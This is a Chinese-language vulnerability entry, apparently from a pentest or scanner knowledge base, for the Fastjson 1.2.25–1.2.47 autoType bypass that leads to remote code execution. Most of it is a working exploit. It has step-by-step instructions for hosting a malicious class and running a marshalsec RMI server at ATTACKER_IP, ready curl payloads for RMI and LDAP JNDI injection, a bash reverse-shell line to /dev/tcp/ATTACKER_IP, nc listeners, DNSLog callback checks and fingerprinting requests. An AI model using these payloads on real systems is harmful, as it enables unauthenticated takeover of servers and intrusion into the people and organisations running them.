---
id: FASTJSON-1.2.47-RCE
title: Fastjson 1.2.47 远程命令执行漏洞
product: fastjson
vendor: Alibaba
version_affected: "1.2.25 - 1.2.47"
severity: CRITICAL
tags: [rce, deserialization, jndi, 无需认证]
fingerprint: ["fastjson", "Fastjson"]
---

## 漏洞描述

Fastjson 在 1.2.24 之后增加了 autoType 白名单限制，但在 1.2.25 至 1.2.47 版本中，攻击者可以利用 `java.lang.Class` 将 `com.sun.rowset.JdbcRowSetImpl` 缓存到类映射中，从而绕过 autoType 检查，触发 JNDI 注入实现远程代码执行。

## 影响版本

- Fastjson 1.2.25 - 1.2.47

## 前置条件

- 无需认证
- 目标应用使用 Fastjson 解析用户可控的 JSON 输入
- 目标 JDK 版本影响 JNDI 利用方式（JDK < 8u121 可直接 RMI，高版本需 LDAP + 本地 gadget）

## 利用步骤

1. 确认目标使用 Fastjson（发送畸形 JSON 观察错误信息）
2. 编写恶意类（如反弹 shell），编译为 `.class` 文件
3. 在攻击机上启动 HTTP 服务托管恶意类文件：`python3 -m http.server 8888`
4. 启动 RMI 或 LDAP 服务器指向恶意类：`java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://ATTACKER_IP:8888/#Exploit" 1099`
5. 向目标发送绕过 payload，触发 JNDI 注入
6. 在攻击机监听反弹 shell 或观察回调

## Payload

```bash
# RMI 利用方式
curl -X POST "http://target:8090/" -H "Content-Type: application/json" -d '{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://ATTACKER_IP:1099/Exploit","autoCommit":true}}'

# LDAP 利用方式
curl -X POST "http://target:8090/" -H "Content-Type: application/json" -d '{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://ATTACKER_IP:1389/Exploit","autoCommit":true}}'
```

## 验证方法

```bash
# 方法 1: DNS 外带确认漏洞存在
curl -X POST "http://target:8090/" -H "Content-Type: application/json" -d '{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://ATTACKER_DNSLOG_DOMAIN/Exploit","autoCommit":true}}'
# 检查 DNSLog 平台是否收到解析记录

# 方法 2: 攻击机监听确认回调
nc -lvp 1099
# 发送 RMI payload 后，若目标存在漏洞，攻击机将收到连接请求

# 方法 3: 反弹 shell 成功后确认
nc -lvp 4444
# 恶意类执行 bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

## 指纹确认

```bash
# 发送畸形 JSON 触发 Fastjson 特征报错
curl -s -X POST "http://target:8090/" -H "Content-Type: application/json" -d '{"@type":"java.lang.AutoCloseable"' | grep -iE "fastjson|alibaba|syntax error"

# 发送非法字符观察是否返回 Fastjson 特有错误格式
curl -s -X POST "http://target:8090/" -H "Content-Type: application/json" -d '{"a":"\x01"}' | grep -i "fastjson"
```

## 参考链接

- https://github.com/alibaba/fastjson/wiki/security_update_20190722
- https://www.freebuf.com/vuls/208339.html
